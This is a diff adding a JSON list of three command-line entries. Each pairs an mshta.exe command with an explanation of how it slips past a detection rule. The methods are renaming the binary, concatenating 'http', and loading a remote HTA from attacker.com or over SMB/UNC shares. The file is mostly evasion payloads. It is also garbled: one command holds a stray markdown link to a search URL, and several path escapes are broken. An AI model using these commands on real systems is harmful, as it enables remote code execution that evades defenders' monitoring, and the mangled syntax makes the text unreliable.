@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\mshta.exe C:\\Users\\Public\\\not\\_mshta.exe && C:\\Users\\Public\\\not\\_mshta.exe \"\\\\10.0.0.5\\share\\malicious.hta\"",
+    "explanation": "The rule is bypassed by satisfying two conditions: 1. Using a UNC path (\\\\host\\share) instead of the monitored protocols (http, https, ftp). 2. Renaming the binary to 'not\\_mshta.exe' and executing it, which bypasses the 'Image|endswith' check if the EDR/SIEM does not correctly resolve the 'OriginalFileName' metadata field in real-time."
+  },
+  {
+    "output": "mshta.exe \"h\"+\"tt\"+\"p://[attacker.com/payload.hta](https://www.google.com/search?q=https://attacker.com/payload.hta)\"",
+    "explanation": "The rule performs a simple string match for 'http://'. Using environment variable expansion, string concatenation within a script wrapper, or alternative URI schemes like 'about:\\<script\\>' to fetch remote content can bypass simple 'contains' logic depending on how the CommandLine is parsed."
+  },
+  {
+    "output": "mshta.exe \\\\live.sysinternals.com\\\tools\\payload.hta",
+    "explanation": "This bypasses the 'selection\\_cli' requirement entirely by using the SMB protocol (UNC path) to load the remote HTA file. Since the rule specifically looks for 'http', 'https', or 'ftp' in the command line, SMB-based remote execution is not detected."
+  }
+]
